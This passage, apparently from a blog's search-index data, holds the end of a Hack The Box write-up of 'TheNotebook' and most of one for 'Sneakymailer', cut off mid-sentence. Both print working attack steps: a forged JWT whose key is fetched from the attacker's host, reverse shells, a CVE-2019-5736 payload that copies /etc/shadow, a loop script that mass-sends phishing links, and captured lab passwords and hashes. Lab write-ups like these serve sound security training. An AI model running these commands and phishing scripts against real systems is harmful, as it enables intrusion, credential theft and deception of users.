eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xMjo3MDcwL3ByaXZLZXkua2V5In0.eyJ1c2VybmFtZSI6InRlc3QxIiwiZW1haWwiOiJ0ZXN0QHRlc3QudGVzdCIsImFkbWluX2NhcCI6dHJ1ZX0.m9QIwUJ0hHW978K2ygqK8KMXuX1wwJGvLBNAf2_JsP8C3nup8zEws9D0cq0Y0-de-4SaOr51FkjwypRmouW5njnfqMykjEKLe8T1q6q1A4_USERSKeM64KWtPmZrEAdZKiWOznycRfpMNd0V2oZX4K3yxUy_-XqrsAj0tbLUsKJXVLtKzVkaryhcKd1yVbz8au-QsapVbXRTfXkxd34aQ4_Q_fu15WJNq8_kPTCLx0qu5iBz3DQvum_2Qtx_8mgyPZP0RUGcQEwwqB49jRiyoyCNqukCbeJ4MWDxNBy5X0kRWkwKHJbRjWkseIVIeC5ghHLQ0z3dA3_R-2iTxAQhov74A7wwjbdnwrG0FqQ71oliHhYFPuewnWHiut9EzvudX-4rVqd4gtGzQyhzn3Jqqf4nVVSP6wH7cBjI93rwYkVuFxByDjAqvhMbTATAPrvx6sC-uT29OOg2yETqhZugMuo847ji6_jRgIdhstPIiRo1UwYJI7ZaskIZIBl72FFX_bIm9D5iuxpEIBpMaUuJbAncUdNwMEro1qpRzECT-1lMopxVeMBS9tOKBKM4ZQszbChXXjvyjIYN2Q3uTCcaKKkxMktg7QAN9x_huP2fZLd1mm1X6rPsRlb_JSreKsSwnCMIkrnMpKhbS71fBP7OHROXqt1NQNyc9S2WDSZGS4M\n\nOpen the Firefox cookie inspector (Shift + F9) and paste the new token. Start a python http.server on port 7070 and browse http://10.10.10.230/admin.\n\nWe get a incomming GET request where the token is verified with our new key, and are allowed to access the site. [root:/git/htb/thenotebook]# python3 -m http.server 7070 (master✱) Serving HTTP on 0.0.0.0 port 7070 (http://0.0.0.0:7070/) … 10.10.10.230 - - [12/May/2021 09:39:07] “GET /privKey.key HTTP/1.1” 200 -\nOn the admin page we can upload files, so lets upload a php reverse shell. Setup a listener and trigger it.\n[root:/git/htb/thenotebook]# nc -lvnp 4488 (master✱) listening on [any] 4488 … connect to [10.10.14.12] from (UNKNOWN) [10.10.10.230] 41364 Linux thenotebook 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux 07:45:33 up 13:47, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can’t access tty; job control turned off $ pwd / $\nUpgrade the shell.\n\nWith access to the backend we can now enumerate the box. There’s one user in /home, noah, however we don’t have access to user.txt. With some manual enumeration we find a backup of the home directory.\n\nwww-data@thenotebook:/var/backups$ ls -al -rw-r–r– 1 root root 4373 Feb 17 09:02 home.tar.gz\nExtract it and download Noah’s private key.\nwww-data@thenotebook:/var/backups$ tar xf home.tar.gz -C /tmp/backup/\nwww-data@thenotebook:/tmp/backup/home/noah/.ssh$ ls -al total 20 drwx—— 2 www-data www-data 4096 Feb 17 08:59 . drwxr-xr-x 5 www-data www-data 4096 Feb 17 09:02 .. -rw-r–r– 1 www-data www-data 398 Feb 17 08:59 authorized_keys -rw——- 1 www-data www-data 1679 Feb 17 08:59 id_rsa -rw-r–r– 1 www-data www-data 398 Feb 17 08:59 id_rsa.pub\nwww-data@thenotebook:/tmp/backup/home/noah/.ssh$ python3 -m http.server 4488 [root:/git/htb/thenotebook]# wget 10.10.10.230:4488/id_rsa -O noah-id_rsa [root:/git/htb/thenotebook]# wget 10.10.10.230:4488/id_rsa.pub -O noah-id_rsa.pub [root:/git/htb/thenotebook]# chmod 600 noah-id_rsa [root:/git/htb/thenotebook]# ssh noah@thenotebook.htb -i noah-id_rsa noah@thenotebook:~$ id uid=1000(noah) gid=1000(noah) groups=1000(noah) noah@thenotebook:~$ cat user.txt 9f6b2966f0a7780f90f9991264050094\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nAs normal, start with ‘sudo -l’ to see if we can grab a easy root.\n\nnoah@thenotebook:/dev/shm$ sudo -l Matching Defaults entries for noah on thenotebook: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin\nUser noah may run the following commands on thenotebook:\n    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*\nAccess the docker and see if we can either break out with a reverse shell (sys_module abuse) or if we find anything interesting.\nnoah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 bash root@0f4c2517af40:/opt/webapp# capsh –print Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap Securebits: 00/0x0/1’b0 secure-noroot: no (unlocked) secure-no-suid-fixup: no (unlocked) secure-keep-caps: no (unlocked) uid=0(root) gid=0(root) groups=\nUnfortunately cap_sys_module is not available, so that’s a no go. We need to start looking for anything else of use.\nroot@0f4c2517af40:/opt/webapp# cat create_db.py .. users = [ User(username=‘admin’, email=‘admin@thenotebook.local’, uuid=admin_uuid, admin_cap=True, password=“0d3ae6d144edfb313a9f0d32186d4836791cbfd5603b2d50cf0d9c948e50ce68”), User(username=‘noah’, email=‘noah@thenotebook.local’, uuid=noah_uuid, password=“e759791d08f3f3dc2338ae627684e3e8a438cd8f87a400cada132415f48e01a2”)\nThe hashes are 64 characters long and haven’t been salted (no :) - looking on hashcat example hashes it is probably SHA256 hashes. Try to crack them;\n[root:/git/htb/thenotebook]# hashcat -a0 -m1400 web.hashes /usr/share/wordlists/rockyou.txt Session……….: hashcat Status………..: Exhausted Hash.Name……..: SHA2-256 Hash.Target……: web.hashes\n\nReading about docker privesc I came across CVE-2019-5736, where they use ‘docker exec’ to get root read/write.\n\n\nStart by downloading the script and changing the payload to whatever you’d like: [root:/git/htb/thenotebook]# wget https://raw.githubusercontent.com/Frichetten/CVE-2019-5736-PoC/master/main.go root@nidus:/git/htb/thenotebook# cat main.go .. var payload = “#!/bin/bash cat /root/root.txt &gt;&gt; /tmp/thejuice && cat /etc/shadow &gt;&gt; /tmp/thejuice && chmod 777 /tmp/thejuice”\n\n[root:/git/htb/thenotebook]# go build main.go [root:/git/htb/thenotebook]# mv main exploit\n\nTransfer the malicious file to the docker container and execute it: root@0f4c2517af40:/tmp# wget http://10.10.14.12/exploit root@4751ba9ed3da:/tmp# chmod +x exploit root@4751ba9ed3da:/tmp# ./exploit [+] Overwritten /bin/sh successfully\nTrigger the exploit by starting a new docker session, note that we use ‘/bin/sh’: noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh No help topic for ‘/bin/sh’\n\nThe exploit on the docker got triggered an terminated the service: [+] Overwritten /bin/sh successfully [+] Found the PID: 31 [+] Successfully got the file handle [+] Successfully got write handle &{0xc000402060}\n\nGo back to the vicitm host (thenotebook.htb) and gather your loot:\n\nnoah@thenotebook:/tmp$ cat thejuice fe842e1e15cbe751b6bb98aea68425d4 root:\\(6\\)OZ7vREXE$yXjcCfK6rhgAfN5oLisMiB8rE/uoZb7hSqTOYCUTF8lNPXgEiHi7zduz1mrTWtFnhKOCZA9XZu12osORyYnKF.:18670:0:99999:7::: .. noah:\\(6\\)fOy3f6Dp$i9.Ut7PlJpP19ZPTqmkmiRwqNunLqNEjNwq1iIeffXGi6OaDy8CtAEXXJf2SkO2fiZxuy.tWuWhsmyvl92L/W.:18670:0:99999:7:::\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nHow to generate JWT RS256 key: https://gist.github.com/ygotthilf/baa58da5c3dd1f69fae9\nJWT.IO: https://jwt.io/\nDocker Breakout, CVE-2019-5736: https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#runc-exploit-cve-2019-5736 https://github.com/Frichetten/CVE-2019-5736-PoC"
  },
  {
    "objectID": "posts/2020-07-29-htb-writeup-sneakymailer/2020-07-29-htb-writeup-sneakymailer.html",
    "href": "posts/2020-07-29-htb-writeup-sneakymailer/2020-07-29-htb-writeup-sneakymailer.html",
    "title": "Sneakymailer - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nroot@nidus:~# nmap -Pn -sC -sV -n 10.10.10.197 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-27 12:18 CEST Nmap scan report for 10.10.10.197 Host is up (0.028s latency). Not shown: 993 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA) | 256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA) |_ 256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 80/tcp open http nginx 1.14.2 |_http-server-header: nginx/1.14.2 |_http-title: Did not follow redirect to http://sneakycorp.htb 143/tcp open imap Courier Imapd (released 2018) |_imap-capabilities: completed STARTTLS OK ACL UIDPLUS QUOTA IMAP4rev1 CAPABILITY ENABLE UTF8=ACCEPTA0001 SORT ACL2=UNION THREAD=REFERENCES CHILDREN THREAD=ORDEREDSUBJECT IDLE NAMESPACE | ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US | Subject Alternative Name: email:postmaster@example.com | Not valid before: 2020-05-14T17:14:21 |_Not valid after: 2021-05-14T17:14:21 |_ssl-date: TLS randomness does not represent time 993/tcp open ssl/imap Courier Imapd (released 2018) |_imap-capabilities: completed AUTH=PLAIN OK ACL UIDPLUS QUOTA IMAP4rev1 CAPABILITY ENABLE UTF8=ACCEPTA0001 SORT ACL2=UNION THREAD=REFERENCES CHILDREN THREAD=ORDEREDSUBJECT IDLE NAMESPACE | ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US | Subject Alternative Name: email:postmaster@example.com | Not valid before: 2020-05-14T17:14:21 |_Not valid after: 2021-05-14T17:14:21 |_ssl-date: TLS randomness does not represent time 8080/tcp open http nginx 1.14.2 |_http-open-proxy: Proxy might be redirecting requests |_http-server-header: nginx/1.14.2 |_http-title: Welcome to nginx! Service Info: Host: debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\nDIRB:\n\nhttp://sneakycorp.htb/index.php (CODE:200|SIZE:13543)\n\nNIKTO:\n\n\n\nFrom the initial nmap scan we can see that port 80 redirects us to http://sneakycorp.htb - add sneakycorp.htb to /etc/hosts. Port 80 gives us a list of all employees of the company, along with title and email. Other then that it says ‘Please check your emails for further instructions and register an account’ - rabbit hole? Looking at the ports it’s quiet obvious that you should enumerate the mail server to find users or any other valuable information.\nUsing cewl I create a wordlist and then start to fish for valid users via metasploit smtp_enum module.\nroot@nidus:/git/htb/sneakymailer# cewl -w sneaky-list.txt -d 4 http://sneakycorp.htb\nmsf5 auxiliary(scanner/smtp/smtp_enum) &gt; set user_file /git/htb/sneakymailer/sneaky-list.txt msf5 auxiliary(scanner/smtp/smtp_enum) &gt; set verbose true msf5 auxiliary(scanner/smtp/smtp_enum) &gt; run\n[*] 10.10.10.197:25 - 10.10.10.197:25 Banner: 220 debian ESMTP Postfix (Debian/GNU) [*] 10.10.10.197:25 - 10.10.10.197:25 Domain Name: debian .. [*] 10.10.10.197:25 - 10.10.10.197:25 - Found user: Developer [*] 10.10.10.197:25 - 10.10.10.197:25 - Found user: PyPI [*] 10.10.10.197:25 - 10.10.10.197:25 - Found user: List .. [+] 10.10.10.197:25 - 10.10.10.197:25 Users found: Developer, List, PyPI, pypi [*] 10.10.10.197:25 - Scanned 1 of 1 hosts (100% complete)\nUsing ffuf we find sneakycorp.htb/pypi/register.php root@nidus:/git/htb/sneakymailer# ffuf -c -w sneaky-list.txt -u http://sneakycorp.htb/pypi/FUZZ.php\n   /'___\\  /'___\\           /'___\\\n  /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n  \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n   \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n    \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n     \\/_/    \\/_/   \\/___/    \\/_/\n\n  v1.1.0-git\n\n :: Method           : GET\n :: URL              : http://sneakycorp.htb/pypi/FUZZ.php\n :: Wordlist         : FUZZ: sneaky-list.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403\n\nregister [Status: 200, Size: 3115, Words: 730, Lines: 82] :: Progress: [370/370] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::\nHere I got stuck for a good while. I tried to connect to the FTP with known users but with no luck. Looking at the HTB forums gave a hint that you (probably) need to phish to get any further. Compile a list of all employees email accounts.\nroot@nidus:/git/htb/sneakymailer# curl http://sneakycorp.htb/team.php | grep @sneakymailer.htb &gt; email-raw.txt\nSort the data:\nroot@nidus:/git/htb/sneakymailer# awk -v RS=“[&gt;&lt;]” ‘/@/’ email-raw.txt &gt; email.txt\nYou can execute your phishing attack with or without a local SMTP server. For educational purpose I did both, which took a lot of time and caused some headache. With a local SMTP server you can verify the status of your emails through /var/log/mail.log which might make it easier if you’re stuck with formating etc - however remote SMTP server is far faster.\n\nLocal SMTP Server\n\nInstall postfix and mailutils root@nidus:/git/htb/sneakymailer# apt install mailutils root@nidus:/git/htb/sneakymailer# apt install postfix When asked about the environment, select ‘Internet Site’. When asked to confirm the hostname, select default “localhost.localdomain”\nConfigure postfix with domain, network, interface, protocol, delimiter and DNS root@nidus:/git/htb/sneakymailer# postconf -e “mydestination = $myhostname, nidus, localhost.localdomain, localhost” root@nidus:/git/htb/sneakymailer# postconf -e “mynetworks = 127.0.0.0/8, 10.10.14.0/24” root@nidus:/git/htb/sneakymailer# postconf -e “inet_interfaces = all” root@nidus:/git/htb/sneakymailer# postconf -e “inet_protocols = ipv4” root@nidus:/git/htb/sneakymailer# postconf -e “recipient_delimiter = +” root@nidus:/git/htb/sneakymailer# postconf -e “lmtp_host_lookup = native” root@nidus:/git/htb/sneakymailer# postconf -e “smtp_host_lookup = native”\nRestart postfix for all changes to take place, and test to send a email via telnet. TELNET) root@nidus:/git/htb/sneakymailer# service postfix restart root@nidus:/git/htb/sneakymailer# telnet localhost 25 220 nidus ESMTP Postfix (Debian/GNU) ehlo localhost mail from: root@localhost rcpt to: zoritaserrano@sneakymailer.htb data Subject: Test mail. Test Body. . quit\nVerify that the email was sent, indicated by ‘status=sent’ root@nidus:/git/htb/sneakymailer# cat /var/log/mail.log Jul 28 18:05:03 nidus postfix/smtpd[175559]: 342481A40360: client=localhost[127.0.0.1] Jul 28 18:05:19 nidus postfix/cleanup[175649]: 342481A40360: message-id=20200728160503.342481A40360@nidus Jul 28 18:05:19 nidus postfix/qmgr[162551]: 342481A40360: from=root@localhost, size=329, nrcpt=1 (queue active) Jul 28 18:05:20 nidus postfix/smtpd[175559]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5 Jul 28 18:05:29 nidus postfix/smtp[175653]: 342481A40360: to=zoritaserrano@sneakymailer.htb, relay=sneakymailer.htb[10.10.10.197]:25, delay=33, delays=22/0.02/10/0.09, dsn=2.0.0, status=sent (250 2.0.0 Ok: queued as 4A6DF24ADD) Jul 28 18:05:29 nidus postfix/qmgr[162551]: 342481A40360: removed\n\nUsing Victim SMTP Server\n\nExecute swaks and point to their server directly. root@nidus:/git/htb/sneakymailer# swaks –to sulcud@sneakymailer.htb –from it-dep@sneakymailer.htb –header “Subject: Test” –body “This is a test.” –server 10.10.10.197; === Trying 10.10.10.197:25… === Connected to 10.10.10.197. .. -&gt; MAIL FROM:it-dep@sneakymailer.htb &lt;- 250 2.1.0 Ok -&gt; RCPT TO:sulcud@sneakymailer.htb &lt;- 250 2.1.5 Ok -&gt; DATA &lt;- 354 End data with . -&gt; Date: Tue, 28 Jul 2020 18:14:08 +0200 -&gt; To: sulcud@sneakymailer.htb -&gt; From: it-dep@sneakymailer.htb -&gt; Subject: Test -&gt; Message-Id: 20200728181408.175962@nidus -&gt; X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/ -&gt; -&gt; This is a test. -&gt; -&gt; -&gt; . &lt;- 250 2.0.0 Ok: queued as 4F5DE24ADF -&gt; QUIT &lt;- 221 2.0.0 Bye === Connection closed with remote host.\n\n\nWhen you are able to send emails it’s time to weaponize your phishing scheme. In this attack we will include a http-link to our IP address, hoping to grab some sensitive data when the victim clicks it. To make it effective we need to make a script to loop through all the employees email addresses.\nI’ve made two different scripts, one when using your own SMTP server and the other when using the victims. NOTE: Before executing the script(s), setup a nc listener on port 80 to capture anyone clicking the link!\n\nLocal SMTP Server - for loop: root@nidus:/git/htb/sneakymailer# cat for-phish.sh #!/bin/bash for i in $(cat email.txt); do swaks –to $i –from bill.gates@microsoft.com –header “Subject: Click the link!” –body “http://10.10.14.4” –server 10.10.14.4 –port 25 done\nUsing Victim SMTP Server - while loop: root@nidus:/git/htb/sneakymailer# cat while-phish.sh #!/bin/bash inputFile=$1\nwhile read mail;\ndo\n   swaks --to $mail --from it-dep@sneakymailer.htb --header \"Subject: Security Audit\" --body \"You need to log into http://10.10.14.4/ to confirm your account.\" --server 10.10.10.197;\ndone &lt; $inputFile\n\nRunning the scripts gives us a reply from Paul Byrd, including a url encoded password. Decode the password and start to hunt for places it can be used. Looking at the POST it seem to be directed to the register form on http://sneakycorp.htb/pypi/register.php\nroot@nidus:/opt/setoolkit# nc -lvnp 80 listening on [any] 80 … connect to [10.10.14.4] from (UNKNOWN) [10.10.10.197] 57254 POST /%20to%20confirm%20your%20account. HTTP/1.1 Host: 10.10.14.4 User-Agent: python-requests/2.23.0 Accept-Encoding: gzip, deflate Accept: / Connection: keep-alive Content-Length: 185 Content-Type: application/x-www-form-urlencoded\nfirstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt\nroot@nidus:/git/htb/sneakymailer# hURL -u “%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt” Original :: %5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt URL DEcoded :: ^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht\nCreds: paulbyrd@sneakymailer.htb:^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht\nDownload and install the email client thunderbird. Upon first start enter the following:\nYour name: Paul Byrd Email Address: paulbyrd@sneakymailer.htb Password: ^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht\nPress ‘Continue’. It will fail to find the server, change to following: INCOMING Protocol: IMAP Server Hostname: sneakymailer.htb Port: 143 SSL: None Authentication: Normal Password\nOUTGOING Protocol: SMTP Server Hostname: sneakymailer.htb Port: 25 SSL: None Authentication: Normal Password\nPress ‘Done’, check ‘I understand the risks’ and then ‘Done’. Restart thunderbird and you’ll be connected to Paul Byrd’s email. After successfully logging in to Paul’s email account we find a message in his “Sent Items”-folder.\n“Hello administrator, I want to change this password for the developer account\nUsername: developer Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C\nPlease notify me when you do it”\nThe credentials developer:m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C work for the FTP server, inside we have the folder dev which within we have write permissions.\nftp&gt; ls -l 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxrwxr-x 8 0 1001 4096 Jul 28 13:32 dev\nWe are able to put a shell here however we can’t reach it - maybe because it’s another owner? We need to think rethink. ftp&gt; ls -l 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 0 0 4096 May 26 19:52 css drwxr-xr-x 2 0 0 4096 May 26 19:52 img -rwxr-xr-x 1 0 0 13742 Jun 23 09:44 index.php drwxr-xr-x 3 0 0 4096 May 26 19:52 js drwxr-xr-x 2 0 0 4096 May 26 19:52 pypi -rwxrwxrwx 1 1001 1001 5492 Jul 28 13:49 rev.php\nAt this point I got a bit frustrated, but then started to think about the name of the box and company - SNEAKY.. Maybe we didn’t find everything in the enumeration so I decided to fuzz for subdomains, and voila(!) dev.sneakycorp.htb.\nroot@nidus:/git/htb/sneakymailer# ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://sneakycorp.htb -H “Host:FUZZ.sneakycorp.htb” -fc 301\n       /'___\\  /'___\\           /'___\\\n      /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n      \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n       \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n        \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n         \\/_/    \\/_/   \\/___/    \\/_/\n\n      v1.1.0-git\n\n:: Method           : GET\n:: URL              : http://sneakycorp.htb\n:: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt\n:: Header           : Host: FUZZ.sneakycorp.htb\n:: Follow redirects : false\n:: Calibration      : false\n:: Timeout          : 10\n:: Threads          : 40\n:: Matcher          : Response status: 200,204,301,302,307,401,403\n:: Filter           : Response status: 301\n\ndev [Status: 200, Size: 13737, Words: 4007, Lines: 341] :: Progress: [20469/20469] :: Job [1/1] :: 1279 req/sec :: Duration: [0:00:16] :: Errors: 0 ::\nAdd dev.sneakycorp.htb to /etc/hosts. Upload your reverse shell through FTP and trigger it http://dev.sneakycorp.htb/rev.php\nroot@nidus:/git/htb/sneakymailer# nc -lvnp 4488 listening on [any] 4488 … connect to [10.10.14.4] from (UNKNOWN) [10.10.10.197] 47296 Linux sneakymailer 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux 14:08:35 up 8:42, 0 users, load average: 0.00, 0.03, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can’t access tty; job control turned off $ whoami www-data\nUpgrade your shell. Looking around in the box we find another subdomain in /var/www - pypi.sneakycorp.htb. In the directory we find .htpasswd, containing a set of credentials. Crack them and add the subdomain to /etc/hosts.\nwww-data@sneakymailer:~/pypi.sneakycorp.htb$ cat .htpasswd pypi:\\(apr1\\)RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/\nroot@nidus:/git/htb/sneakymailer# hashcat -a0 -m1600 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt –force .. Session……….: hashcat Status………..: Cracked\nroot@nidus:/git/htb/sneakymailer# cat cracked.txt \\(apr1\\)RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/:soufianeelhaoui\nYou reach the subdomain on port 8080 - http://pypi.sneakycorp.htb\nOn the pypi subdomain we are able to login with out new found credentials. Here we are able to install python packages to be run on the victim server. Looking for packages I found none that would grant me reverse access to the victim, so instead I started to look on how to create your own custom package. Follow the guidelines on linode.com (linked below) to create your files.\nwww-data@sneakymailer:/dev/shm$ mkdir p3pkg www-data@sneakymailer:/dev/shm$ cd p3pkg www-data@sneakymailer:/dev/shm/p3pkg$ touch README.md setup.cfg setup.py\nwww-data@sneakymailer:/dev/shm/p3pkg$ mkdir p3pkg www-data@sneakymailer:/dev/shm/p3pkg$ cd p3pkg/ www-data@sneakymailer:/dev/shm/p3pkg/p3pkg$ touch init.py\nwww-data@sneakymailer:/dev/shm/p3pkg$ tree . ├── p3pkg │   └── init.py ├── README.md ├── setup.cfg └── setup.py\nINFORMATION ABOUT EACH FILE\n\nSetup.py: .. contains information about your package that PyPi needs, like its name, a description, the current version etc.\nSetup.cfg: .. contains metadata. If you have a description file (and you definitely should!), you can specify it here.\nREADME.md .. installation guidelines, dependencies etc. Best practice to use when publishing to public PyPI repo.\ninit.py: .. is used to mark which classes you want the user to access through the package interface. This is where you enter your code.\n\nYou should now have code in all files except the README-file. For a easy proof of concept I copy pasted the example “Hello World” init-file to be uploaded before making a malicious package.\nwww-data@sneakymailer:/dev/shm/p3pkg$ cat setup.cfg [metadata] description-file = README.md\nwww-data@sneakymailer:/dev/shm/p3pkg$ cat setup.py from setuptools import setup\nsetup( name=‘p3.Hello’, packages=[‘p3pkg’], description=‘Give me user please.’, version=‘0.1’, author=‘PlayerThree’, author_email=‘PlayerThree@htb.eu’, keywords=[‘p3’,‘privesc’] )\nCompress the package and you’ll find your .tar.gz-file in the dist directory.\nwww-data@sneakymailer:/dev/shm/p3pkg$ python3 setup.py sdist running sdist running egg_info creating p3.Hello.egg-info writing p3.Hello.egg-info/PKG-INFO writing dependency_links to p3.Hello.egg-info/dependency_links.txt writing top-level names to p3.Hello.egg-info/top_level.txt writing manifest file ‘p3.Hello.egg-info/SOURCES.txt’ package init file ‘p3pkg/init.py’ not found (or not a regular file) reading manifest file ‘p3.Hello.egg-info/SOURCES.txt’ writing manifest file ‘p3.Hello.egg-info/SOURCES.txt’ running check warning: check: missing required meta-data: url\ncreating p3.Hello-0.1 creating p3.Hello-0.1/p3.Hello.egg-info copying files to p3.Hello-0.1… copying README.md -&gt; p3.Hello-0.1 copying setup.cfg -&gt; p3.Hello-0.1 copying setup.py -&gt; p3.Hello-0.1 copying p3.Hello.egg-info/PKG-INFO -&gt; p3.Hello-0.1/p3.Hello.egg-info copying p3.Hello.egg-info/SOURCES.txt -&gt; p3.Hello-0.1/p3.Hello.egg-info copying p3.Hello.egg-info/dependency_links.txt -&gt; p3.Hello-0.1/p3.Hello.egg-info copying p3.Hello.egg-info/top_level.txt -&gt; p3.Hello-0.1/p3.Hello.egg-info Writing p3.Hello-0.1/setup.cfg creating dist Creating tar archive removing ‘p3.Hello-0.1’ (and everything under it)\nwww-data@sneakymailer:/dev/shm/p3pkg$ ls dist/ p3.Hello-0.1.tar.gz\nNow when we have our package created, we need to upload it. We do this in two (2) steps:\n\nCreate a .pypirc-file in our home directory, containing information pointing towards our new repository. However we don’t have write permissions in home, so we need to change the environment variable of home to another folder to do this.\nwww-data@sneakymailer:~$ touch .pypirc touch: cannot touch ‘.pypirc’: Permission denied\nwww-data@sneakymailer:~$ cd /dev/shm/p3pkg www-data@sneakymailer:/dev/shm/p3pkg$ export HOME=/dev/shm/p3pkg www-data@sneakymailer:~$ touch .pypirc www-data@sneakymailer:~$ cat .pypirc [distutils] index-servers = pypi p3pkg [pypi] username: password: [p3pkg] repository: http://127.0.0.1:8080 username: pypi password: soufianeelhaoui\nUpload the package. If successful you’ll get message ‘Server Response (200): OK’.\nwww-data@sneakymailer:~$ python3 setup.py sdist upload -r p3pkg .. Submitting dist/p3.Hello-0.1.tar.gz to http://127.0.0.1:8080 Server response (200): OK\n\nMy first thought here was to inject a reverse shell into the setup.py file. This worked great however I was still user 